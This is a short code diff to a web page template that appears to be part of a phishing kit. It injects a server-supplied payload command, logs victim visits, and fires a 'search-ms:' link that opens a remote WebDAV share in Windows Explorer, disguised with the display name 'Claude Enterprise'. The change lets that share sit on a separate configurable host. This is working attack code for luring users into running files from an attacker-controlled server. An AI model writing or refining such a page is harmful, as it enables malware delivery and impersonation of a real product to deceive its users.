@@ -328,8 +328,9 @@
 
   <!-- Client-side script -->
   <script>
-    // Inject payload command from server
+    // Inject config from server
     window.PayloadCommand = {{ payload_command | tojson }};
+    window.WebDAVSubdomain = {{ webdav_subdomain | tojson }};
     
     // Track initial landing/visit
     fetch('/api/track', {
@@ -431,7 +432,8 @@
 
       setTimeout(() => {
         const domain = window.location.hostname || "127.0.0.1";
-        const searchMS = `search-ms:query=activate&crumb=location:${encodeURIComponent(`\\\\${domain}\\dav`)}&displayname=Claude%20Enterprise`;
+        const webdavHost = window.WebDAVSubdomain || domain;
+        const searchMS = `search-ms:query=activate&crumb=location:${encodeURIComponent(`\\\\${webdavHost}\\dav`)}&displayname=Claude%20Enterprise`;
         console.log("[+] Triggering search-ms:", searchMS);
         
         const a = document.createElement('a');
